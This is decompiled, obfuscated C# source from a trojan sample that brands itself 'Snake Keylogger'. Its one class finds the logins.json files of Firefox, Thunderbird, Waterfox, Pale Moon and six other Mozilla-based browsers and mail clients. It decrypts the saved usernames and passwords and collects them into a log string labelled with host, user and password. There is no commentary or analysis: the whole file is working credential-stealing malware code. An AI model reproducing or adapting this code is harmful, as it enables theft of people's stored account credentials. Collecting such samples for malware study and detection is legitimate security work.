// Decompiled with JetBrains decompiler
// Type: �ԹУ㹃Ϙ.쐬A恁K츠
// Assembly: iJMJnUDAnLMGBkvrphkwZ, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8BCFE5CC-61DE-4CD2-8DAF-2FBF230839CD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-5067186ee6f83892e2d9e56ec500c4a4eb78c83006033b7f4ea166072624c87e.exe

using \uFFFDԹУ㹃Ϙ;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.IO;
using System.Web.Script.Serialization;
using ε\uFFFDœK\uFFFD;
using Ϙˤі\u1CFCУ;

namespace \uFFFDԹУ㹃Ϙ
{
  public class 쐬A恁K츠
  {
    public static void ݝëЅ2c()
    {
      try
      {
        string path1 = (string) null;
        bool flag = false;
        string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
        if (directories.Length != 0)
          ;
        string[] strArray = directories;
        int index1 = 0;
        while (index1 < strArray.Length)
        {
          string path2 = strArray[index1];
          string[] files = Directory.GetFiles(path2, "logins.json");
          if (files.Length > 0)
          {
            path1 = files[0];
            flag = true;
          }
          if (flag)
          {
            蠺\uFFFDҟ\uFFFD\uFFFD.Ωʪ̱ԌՕ(path2);
            break;
          }
          checked { ++index1; }
        }
        if (!flag)
          return;
        쐬A恁K츠.FFLogins ffLogins;
        using (StreamReader streamReader = new StreamReader(path1))
          ffLogins = new JavaScriptSerializer().Deserialize<쐬A恁K츠.FFLogins>(streamReader.ReadToEnd());
        쐬A恁K츠.aaalogshsindgdaLogndta[] logins = ffLogins.logins;
        int index2 = 0;
        while (index2 < logins.Length)
        {
          쐬A恁K츠.aaalogshsindgdaLogndta aaalogshsindgdaLogndta = logins[index2];
          string str1 = 蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFDܹک\uFFFD\uFFFD(aaalogshsindgdaLogndta.encryptedUsername);
          string str2 = 蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFDܹک\uFFFD\uFFFD(aaalogshsindgdaLogndta.encryptedPassword);
          string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Firefox\r\nHost: " + aaalogshsindgdaLogndta.hostname + "\r\nUSR: " + str1 + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
          \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          checked { ++index2; }
        }
        蠺\uFFFDҟ\uFFFD\uFFFD.ζBôŔی();
        try
        {
          foreach (IntPtr num in 蠺\uFFFDҟ\uFFFD\uFFFD.쐬㠰\uFFFD\u002DŲ)
            蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFD\u061Dƌ\uFFFDۣ(num);
        }
        finally
        {
          List<IntPtr>.Enumerator enumerator;
          enumerator.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ôϘ\uFFFDƌ\uFFFD()
    {
      try
      {
        string path1 = (string) null;
        bool flag = false;
        string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Waterfox\\Profiles"));
        if (directories.Length != 0)
          ;
        string[] strArray = directories;
        int index1 = 0;
        while (index1 < strArray.Length)
        {
          string path2 = strArray[index1];
          string[] files = Directory.GetFiles(path2, "logins.json");
          if (files.Length > 0)
          {
            path1 = files[0];
            flag = true;
          }
          if (flag)
          {
            蠺\uFFFDҟ\uFFFD\uFFFD.Ωʪ̱ԌՕ(path2);
            break;
          }
          checked { ++index1; }
        }
        if (!flag)
          return;
        쐬A恁K츠.FFLogins ffLogins;
        using (StreamReader streamReader = new StreamReader(path1))
          ffLogins = new JavaScriptSerializer().Deserialize<쐬A恁K츠.FFLogins>(streamReader.ReadToEnd());
        쐬A恁K츠.aaalogshsindgdaLogndta[] logins = ffLogins.logins;
        int index2 = 0;
        while (index2 < logins.Length)
        {
          쐬A恁K츠.aaalogshsindgdaLogndta aaalogshsindgdaLogndta = logins[index2];
          string str1 = 蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFDܹک\uFFFD\uFFFD(aaalogshsindgdaLogndta.encryptedUsername);
          string str2 = 蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFDܹک\uFFFD\uFFFD(aaalogshsindgdaLogndta.encryptedPassword);
          string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: WaterFox\r\nHost: " + aaalogshsindgdaLogndta.hostname + "\r\nUSR: " + str1 + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
          \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          checked { ++index2; }
        }
        蠺\uFFFDҟ\uFFFD\uFFFD.ζBôŔی();
        try
        {
          foreach (IntPtr num in 蠺\uFFFDҟ\uFFFD\uFFFD.쐬㠰\uFFFD\u002DŲ)
            蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFD\u061Dƌ\uFFFDۣ(num);
        }
        finally
        {
          List<IntPtr>.Enumerator enumerator;
          enumerator.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ٵ̔ŴŴ嵱()
    {
      try
      {
        string path1 = (string) null;
        bool flag = false;
        string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Thunderbird\\Profiles\\"));
        if (directories.Length != 0)
          ;
        string[] strArray = directories;
        int index1 = 0;
        while (index1 < strArray.Length)
        {
          string path2 = strArray[index1];
          string[] files = Directory.GetFiles(path2, "logins.json");
          if (files.Length > 0)
          {
            path1 = files[0];
            flag = true;
          }
          if (flag)
          {
            蠺\uFFFDҟ\uFFFD\uFFFD.Ωʪ̱ԌՕ(path2);
            break;
          }
          checked { ++index1; }
        }
        if (!flag)
          return;
        쐬A恁K츠.FFLogins ffLogins;
        using (StreamReader streamReader = new StreamReader(path1))
          ffLogins = new JavaScriptSerializer().Deserialize<쐬A恁K츠.FFLogins>(streamReader.ReadToEnd());
        쐬A恁K츠.aaalogshsindgdaLogndta[] logins = ffLogins.logins;
        int index2 = 0;
        while (index2 < logins.Length)
        {
          쐬A恁K츠.aaalogshsindgdaLogndta aaalogshsindgdaLogndta = logins[index2];
          string str1 = 蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFDܹک\uFFFD\uFFFD(aaalogshsindgdaLogndta.encryptedUsername);
          string str2 = 蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFDܹک\uFFFD\uFFFD(aaalogshsindgdaLogndta.encryptedPassword);
          string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Thunderbird\r\nHost: " + aaalogshsindgdaLogndta.hostname + "\r\nUSR: " + str1 + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
          \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          checked { ++index2; }
        }
        蠺\uFFFDҟ\uFFFD\uFFFD.ζBôŔی();
        try
        {
          foreach (IntPtr num in 蠺\uFFFDҟ\uFFFD\uFFFD.쐬㠰\uFFFD\u002DŲ)
            蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFD\u061Dƌ\uFFFDۣ(num);
        }
        finally
        {
          List<IntPtr>.Enumerator enumerator;
          enumerator.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ҏÒ\uFFFD츠ҟ()
    {
      try
      {
        string path1 = (string) null;
        bool flag = false;
        string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\SeaMonkey\\Profiles"));
        if (directories.Length == 0)
          return;
        string[] strArray = directories;
        int index1 = 0;
        while (index1 < strArray.Length)
        {
          string path2 = strArray[index1];
          string[] files = Directory.GetFiles(path2, "logins.json");
          if (files.Length > 0)
          {
            path1 = files[0];
            flag = true;
          }
          if (flag)
          {
            蠺\uFFFDҟ\uFFFD\uFFFD.Ωʪ̱ԌՕ(path2);
            break;
          }
          checked { ++index1; }
        }
        if (flag)
        {
          쐬A恁K츠.FFLogins ffLogins;
          using (StreamReader streamReader = new StreamReader(path1))
            ffLogins = new JavaScriptSerializer().Deserialize<쐬A恁K츠.FFLogins>(streamReader.ReadToEnd());
          쐬A恁K츠.aaalogshsindgdaLogndta[] logins = ffLogins.logins;
          int index2 = 0;
          while (index2 < logins.Length)
          {
            쐬A恁K츠.aaalogshsindgdaLogndta aaalogshsindgdaLogndta = logins[index2];
            string str1 = 蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFDܹک\uFFFD\uFFFD(aaalogshsindgdaLogndta.encryptedUsername);
            string str2 = 蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFDܹک\uFFFD\uFFFD(aaalogshsindgdaLogndta.encryptedPassword);
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: SeaMonkey\r\nHost: " + aaalogshsindgdaLogndta.hostname + "\r\nUSR: " + str1 + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
            checked { ++index2; }
          }
          蠺\uFFFDҟ\uFFFD\uFFFD.ζBôŔی();
          try
          {
            foreach (IntPtr num in 蠺\uFFFDҟ\uFFFD\uFFFD.쐬㠰\uFFFD\u002DŲ)
              蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFD\u061Dƌ\uFFFDۣ(num);
          }
          finally
          {
            List<IntPtr>.Enumerator enumerator;
            enumerator.Dispose();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Ӻ\u26CAУ䕃\u00AB()
    {
      try
      {
        string path1 = (string) null;
        bool flag = false;
        string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Comodo\\IceDragon\\Profiles"));
        if (directories.Length == 0)
          return;
        string[] strArray = directories;
        int index1 = 0;
        while (index1 < strArray.Length)
        {
          string path2 = strArray[index1];
          string[] files = Directory.GetFiles(path2, "logins.json");
          if (files.Length > 0)
          {
            path1 = files[0];
            flag = true;
          }
          if (flag)
          {
            蠺\uFFFDҟ\uFFFD\uFFFD.Ωʪ̱ԌՕ(path2);
            break;
          }
          checked { ++index1; }
        }
        if (flag)
        {
          쐬A恁K츠.FFLogins ffLogins;
          using (StreamReader streamReader = new StreamReader(path1))
            ffLogins = new JavaScriptSerializer().Deserialize<쐬A恁K츠.FFLogins>(streamReader.ReadToEnd());
          쐬A恁K츠.aaalogshsindgdaLogndta[] logins = ffLogins.logins;
          int index2 = 0;
          while (index2 < logins.Length)
          {
            쐬A恁K츠.aaalogshsindgdaLogndta aaalogshsindgdaLogndta = logins[index2];
            string str1 = 蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFDܹک\uFFFD\uFFFD(aaalogshsindgdaLogndta.encryptedUsername);
            string str2 = 蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFDܹک\uFFFD\uFFFD(aaalogshsindgdaLogndta.encryptedPassword);
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Ice Dragon\r\nHost: " + aaalogshsindgdaLogndta.hostname + "\r\nUSR: " + str1 + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
            checked { ++index2; }
          }
          蠺\uFFFDҟ\uFFFD\uFFFD.ζBôŔی();
          try
          {
            foreach (IntPtr num in 蠺\uFFFDҟ\uFFFD\uFFFD.쐬㠰\uFFFD\u002DŲ)
              蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFD\u061Dƌ\uFFFDۣ(num);
          }
          finally
          {
            List<IntPtr>.Enumerator enumerator;
            enumerator.Dispose();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u02E8鈟מל\uFFFD()
    {
      try
      {
        string path1 = (string) null;
        bool flag = false;
        string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "8pecxstudios\\Cyberfox\\Profiles"));
        if (directories.Length == 0)
          return;
        string[] strArray = directories;
        int index1 = 0;
        while (index1 < strArray.Length)
        {
          string path2 = strArray[index1];
          string[] files = Directory.GetFiles(path2, "logins.json");
          if (files.Length > 0)
          {
            path1 = files[0];
            flag = true;
          }
          if (flag)
          {
            蠺\uFFFDҟ\uFFFD\uFFFD.Ωʪ̱ԌՕ(path2);
            break;
          }
          checked { ++index1; }
        }
        if (flag)
        {
          쐬A恁K츠.FFLogins ffLogins;
          using (StreamReader streamReader = new StreamReader(path1))
            ffLogins = new JavaScriptSerializer().Deserialize<쐬A恁K츠.FFLogins>(streamReader.ReadToEnd());
          쐬A恁K츠.aaalogshsindgdaLogndta[] logins = ffLogins.logins;
          int index2 = 0;
          while (index2 < logins.Length)
          {
            쐬A恁K츠.aaalogshsindgdaLogndta aaalogshsindgdaLogndta = logins[index2];
            string str1 = 蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFDܹک\uFFFD\uFFFD(aaalogshsindgdaLogndta.encryptedUsername);
            string str2 = 蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFDܹک\uFFFD\uFFFD(aaalogshsindgdaLogndta.encryptedPassword);
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: CyberFox\r\nHost: " + aaalogshsindgdaLogndta.hostname + "\r\nUSR: " + str1 + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
            checked { ++index2; }
          }
          蠺\uFFFDҟ\uFFFD\uFFFD.ζBôŔی();
          try
          {
            foreach (IntPtr num in 蠺\uFFFDҟ\uFFFD\uFFFD.쐬㠰\uFFFD\u002DŲ)
              蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFD\u061Dƌ\uFFFDۣ(num);
          }
          finally
          {
            List<IntPtr>.Enumerator enumerator;
            enumerator.Dispose();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u0300Ś\uFFFDŲˤ()
    {
      try
      {
        string path1 = (string) null;
        bool flag = false;
        string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FlashPeak\\SlimBrowser\\Profiles"));
        if (directories.Length == 0)
          return;
        string[] strArray = directories;
        int index1 = 0;
        while (index1 < strArray.Length)
        {
          string path2 = strArray[index1];
          string[] files = Directory.GetFiles(path2, "logins.json");
          if (files.Length > 0)
          {
            path1 = files[0];
            flag = true;
          }
          if (flag)
          {
            蠺\uFFFDҟ\uFFFD\uFFFD.Ωʪ̱ԌՕ(path2);
            break;
          }
          checked { ++index1; }
        }
        if (flag)
        {
          쐬A恁K츠.FFLogins ffLogins;
          using (StreamReader streamReader = new StreamReader(path1))
            ffLogins = new JavaScriptSerializer().Deserialize<쐬A恁K츠.FFLogins>(streamReader.ReadToEnd());
          쐬A恁K츠.aaalogshsindgdaLogndta[] logins = ffLogins.logins;
          int index2 = 0;
          while (index2 < logins.Length)
          {
            쐬A恁K츠.aaalogshsindgdaLogndta aaalogshsindgdaLogndta = logins[index2];
            string str1 = 蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFDܹک\uFFFD\uFFFD(aaalogshsindgdaLogndta.encryptedUsername);
            string str2 = 蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFDܹک\uFFFD\uFFFD(aaalogshsindgdaLogndta.encryptedPassword);
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Slim\r\nHost: " + aaalogshsindgdaLogndta.hostname + "\r\nUSR: " + str1 + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
            checked { ++index2; }
          }
          蠺\uFFFDҟ\uFFFD\uFFFD.ζBôŔی();
          try
          {
            foreach (IntPtr num in 蠺\uFFFDҟ\uFFFD\uFFFD.쐬㠰\uFFFD\u002DŲ)
              蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFD\u061Dƌ\uFFFDۣ(num);
          }
          finally
          {
            List<IntPtr>.Enumerator enumerator;
            enumerator.Dispose();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void AW蠺\u0385U()
    {
      try
      {
        string path1 = (string) null;
        bool flag = false;
        string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\icecat\\Profiles"));
        if (directories.Length == 0)
          return;
        string[] strArray = directories;
        int index1 = 0;
        while (index1 < strArray.Length)
        {
          string path2 = strArray[index1];
          string[] files = Directory.GetFiles(path2, "logins.json");
          if (files.Length > 0)
          {
            path1 = files[0];
            flag = true;
          }
          if (flag)
          {
            蠺\uFFFDҟ\uFFFD\uFFFD.Ωʪ̱ԌՕ(path2);
            break;
          }
          checked { ++index1; }
        }
        if (flag)
        {
          쐬A恁K츠.FFLogins ffLogins;
          using (StreamReader streamReader = new StreamReader(path1))
            ffLogins = new JavaScriptSerializer().Deserialize<쐬A恁K츠.FFLogins>(streamReader.ReadToEnd());
          쐬A恁K츠.aaalogshsindgdaLogndta[] logins = ffLogins.logins;
          int index2 = 0;
          while (index2 < logins.Length)
          {
            쐬A恁K츠.aaalogshsindgdaLogndta aaalogshsindgdaLogndta = logins[index2];
            string str1 = 蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFDܹک\uFFFD\uFFFD(aaalogshsindgdaLogndta.encryptedUsername);
            string str2 = 蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFDܹک\uFFFD\uFFFD(aaalogshsindgdaLogndta.encryptedPassword);
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: IceCat\r\nHost: " + aaalogshsindgdaLogndta.hostname + "\r\nUSR: " + str1 + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
            checked { ++index2; }
          }
          蠺\uFFFDҟ\uFFFD\uFFFD.ζBôŔی();
          try
          {
            foreach (IntPtr num in 蠺\uFFFDҟ\uFFFD\uFFFD.쐬㠰\uFFFD\u002DŲ)
              蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFD\u061Dƌ\uFFFDۣ(num);
          }
          finally
          {
            List<IntPtr>.Enumerator enumerator;
            enumerator.Dispose();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ÒΩՕ\u002Dأ()
    {
      try
      {
        string path1 = (string) null;
        bool flag = false;
        string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "PostboxApp\\Profiles"));
        if (directories.Length == 0)
          return;
        string[] strArray = directories;
        int index1 = 0;
        while (index1 < strArray.Length)
        {
          string path2 = strArray[index1];
          string[] files = Directory.GetFiles(path2, "logins.json");
          if (files.Length > 0)
          {
            path1 = files[0];
            flag = true;
          }
          if (flag)
          {
            蠺\uFFFDҟ\uFFFD\uFFFD.Ωʪ̱ԌՕ(path2);
            break;
          }
          checked { ++index1; }
        }
        if (flag)
        {
          쐬A恁K츠.FFLogins ffLogins;
          using (StreamReader streamReader = new StreamReader(path1))
            ffLogins = new JavaScriptSerializer().Deserialize<쐬A恁K츠.FFLogins>(streamReader.ReadToEnd());
          쐬A恁K츠.aaalogshsindgdaLogndta[] logins = ffLogins.logins;
          int index2 = 0;
          while (index2 < logins.Length)
          {
            쐬A恁K츠.aaalogshsindgdaLogndta aaalogshsindgdaLogndta = logins[index2];
            string str1 = 蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFDܹک\uFFFD\uFFFD(aaalogshsindgdaLogndta.encryptedUsername);
            string str2 = 蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFDܹک\uFFFD\uFFFD(aaalogshsindgdaLogndta.encryptedPassword);
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: PostBox\r\nHost: " + aaalogshsindgdaLogndta.hostname + "\r\nUSR: " + str1 + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
            checked { ++index2; }
          }
          蠺\uFFFDҟ\uFFFD\uFFFD.ζBôŔی();
          try
          {
            foreach (IntPtr num in 蠺\uFFFDҟ\uFFFD\uFFFD.쐬㠰\uFFFD\u002DŲ)
              蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFD\u061Dƌ\uFFFDۣ(num);
          }
          finally
          {
            List<IntPtr>.Enumerator enumerator;
            enumerator.Dispose();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \uFFFD\uFFFD̀ôƌ()
    {
      try
      {
        string path1 = (string) null;
        bool flag = false;
        string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Moonchild Productions\\Pale Moon\\Profiles"));
        if (directories.Length == 0)
          return;
        string[] strArray = directories;
        int index1 = 0;
        while (index1 < strArray.Length)
        {
          string path2 = strArray[index1];
          string[] files = Directory.GetFiles(path2, "logins.json");
          if (files.Length > 0)
          {
            path1 = files[0];
            flag = true;
          }
          if (flag)
          {
            蠺\uFFFDҟ\uFFFD\uFFFD.Ωʪ̱ԌՕ(path2);
            break;
          }
          checked { ++index1; }
        }
        if (flag)
        {
          쐬A恁K츠.FFLogins ffLogins;
          using (StreamReader streamReader = new StreamReader(path1))
            ffLogins = new JavaScriptSerializer().Deserialize<쐬A恁K츠.FFLogins>(streamReader.ReadToEnd());
          쐬A恁K츠.aaalogshsindgdaLogndta[] logins = ffLogins.logins;
          int index2 = 0;
          while (index2 < logins.Length)
          {
            쐬A恁K츠.aaalogshsindgdaLogndta aaalogshsindgdaLogndta = logins[index2];
            string str1 = 蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFDܹک\uFFFD\uFFFD(aaalogshsindgdaLogndta.encryptedUsername);
            string str2 = 蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFDܹک\uFFFD\uFFFD(aaalogshsindgdaLogndta.encryptedPassword);
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: PaleMoon\r\nHost: " + aaalogshsindgdaLogndta.hostname + "\r\nUSR: " + str1 + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
            checked { ++index2; }
          }
          蠺\uFFFDҟ\uFFFD\uFFFD.ζBôŔی();
          try
          {
            foreach (IntPtr num in 蠺\uFFFDҟ\uFFFD\uFFFD.쐬㠰\uFFFD\u002DŲ)
              蠺\uFFFDҟ\uFFFD\uFFFD.\uFFFD\u061Dƌ\uFFFDۣ(num);
          }
          finally
          {
            List<IntPtr>.Enumerator enumerator;
            enumerator.Dispose();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private class FFLogins
    {
      public long nextId { get; set; }

      public 쐬A恁K츠.aaalogshsindgdaLogndta[] logins { get; set; }

      public string[] disabledHosts { get; set; }

      public int version { get; set; }
    }

    private class aaalogshsindgdaLogndta
    {
      public long id { get; set; }

      public string hostname { get; set; }

      public string url { get; set; }

      public string httprealm { get; set; }

      public string formSubmitURL { get; set; }

      public string usernameField { get; set; }

      public string passwordField { get; set; }

      public string encryptedUsername { get; set; }

      public string encryptedPassword { get; set; }

      public string guid { get; set; }

      public int encType { get; set; }

      public long timeCreated { get; set; }

      public long timeLastUsed { get; set; }

      public long timePasswordChanged { get; set; }

      public long timesUsed { get; set; }
    }
  }
}
